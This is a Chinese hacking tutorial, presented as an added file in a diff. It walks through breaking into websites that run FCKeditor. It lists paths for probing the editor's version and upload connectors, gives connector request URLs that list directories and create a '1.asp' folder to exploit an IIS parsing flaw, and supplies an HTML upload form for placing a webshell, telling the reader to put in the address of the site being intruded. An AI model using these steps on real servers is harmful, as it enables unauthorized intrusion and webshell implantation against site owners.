@@ -1,0 +1,46 @@
+Fckedit本地构造（1） 
+首先,你得确定下Fckeditor的版本。
+ 
+/FCKeditor/editor/dialog/fck_about.html
+其次,你确定下以下几个上传页面是否真的被删除了呢?
+ 
+/FCKeditor/editor/filemanager/browser/default/browser.html
+/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+/FCKeditor/editor/filemanager/upload/test.html
+/FCKeditor/editor/filemanager/connectors/test.html
+/FCKeditor/editor/filemanager/connectors/uploadtest.html
+ 
+嗯,好吧,都已经删除了,真是太倒霉了,怎么办,确认下这些文件有哪个存在的么
+ 
+/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
+/fckeditor/editor/filemanager/connectors/asp/connector.asp
+/fckeditor/editor/filemanager/connectors/php/connector.php
+
+如果存在,那太好了,你可以继续看下去了,我这里以aspx的为例
+ 
+1.查看Media目录下的文件：
+ 
+/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Media&CurrentFolder=%2F
+ 
+红色Media可以更改为File或者image,相应的进入文件或者图片目录下
+ 
+2.利用iis解析漏洞创建1.asp特殊目录
+ 
+fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Media&CurrentFolder=%2F&NewFolderName=1.asp
+ 
+红色的是对应的Media目录,蓝色的是特殊目录名字
+ 
+ 3.构建表单,上传webshell到特殊目录
+ 
+<form id="frmUpload" enctype="multipart/form-data" action="http://www.92hack.net/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=Media&CurrentFolder=%2Fasp.asp" method="post">
+Upload a new file:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+</form>
+ 
+将以上代表保存为HTML格式,http://www.xxx.com修改成你入侵的网站地址,Type=Media是对应的Media目录,1.asp为特殊目录名。
+ 
+最后的一些提示
+ 
+上传之后的路径需要你在上传表单里面的代码里找,当然,他的呈现方式是一个上传好了的文件名,全路径必须你自己组合,我相信你是会的。如果访问之后发现无法访问,试着上传一张正确的图片,再进行访问,如果访问成功,说明管理员已经补上了IIS路径解析漏洞,那你得另找出路了。
+转载自博客http://www.52sky.org/
